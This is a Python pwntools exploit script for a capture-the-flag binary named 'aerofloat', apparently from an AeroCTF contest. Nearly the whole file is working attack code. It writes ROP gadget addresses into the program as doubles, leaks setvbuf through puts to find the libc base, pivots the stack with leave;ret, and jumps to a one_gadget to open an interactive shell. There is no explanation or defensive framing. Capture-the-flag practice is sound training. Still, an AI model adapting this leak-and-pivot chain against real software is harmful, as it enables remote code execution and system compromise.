# -*- coding: utf-8 -*-

from pwn import *

R = process("./aerofloat")
#r = remote("tasks.aeroctf.com",33017)
#r = process(['./ld-linux-x86-64.so.2', './aerofloat'], env={'LD_PRELOAD':'./libc.so.6'})

GOMI = "123"
BUF = 0x404800

onegadget_offset = 0x10a38c
setvbuf_offset = 0x0812f0
pop_rdi = 0x4015bb
pop_rsi_r15 = 0x4015b9
pop_rbp = 0x401179
setvbuf_got = 0x404038
puts = 0x401030
read_BUF = 0x4014eb
leave_ret = 0x4013ed
 
def tolf(x):
    return str(struct.unpack("d",struct.pack("q",x))[0])

def set_(r, id_, rate):
    r.sendlineafter("> ","1")
    r.sendlineafter("id: ", id_)
    r.sendlineafter("rating: ", rate)

def prepare(r):
    r.recvuntil("Enter name: ")
    r.sendline(GOMI)
    i = 1
    for i in range(11):
        set_(r, GOMI, GOMI)
 
def gen_rop1(r):
    set_(r, p32(0x0)+p32(11), GOMI)
    set_(r, p64(BUF), tolf(pop_rdi))
    set_(r, p64(setvbuf_got), tolf(puts))
    set_(r, p64(pop_rdi), tolf(BUF+8))
    set_(r, p64(pop_rsi_r15), tolf(0x50))
    set_(r, p64(0x0), tolf(read_BUF))
    set_(r, p64(pop_rbp), tolf(BUF))
    set_(r, p64(leave_ret), GOMI)

def get_libcbase(r):
    r.recvuntil("4. Exit\n> ")
    r.sendline("4")
    res = r.recv()[:-1]
    setvbuf_libc = u64(res.ljust(8,b'\x00'))
    libc = setvbuf_libc - setvbuf_offset
    log.info("libc_base: "+hex(libc))
    return libc

def gen_onegadget(r):
    libc_base = get_libcbase(r)
    one_gadget = libc_base + onegadget_offset
    return one_gadget

def gen_rop2(r, one_gadget):
    rop2 = b''
    rop2 += p64(one_gadget) 
    r.sendline(rop2)
    
def main(r):
    prepare(r) 
    gen_rop1(r)
    gen_rop2(r, gen_onegadget(r))
    r.interactive()

if __name__ == '__main__':
    main(R)
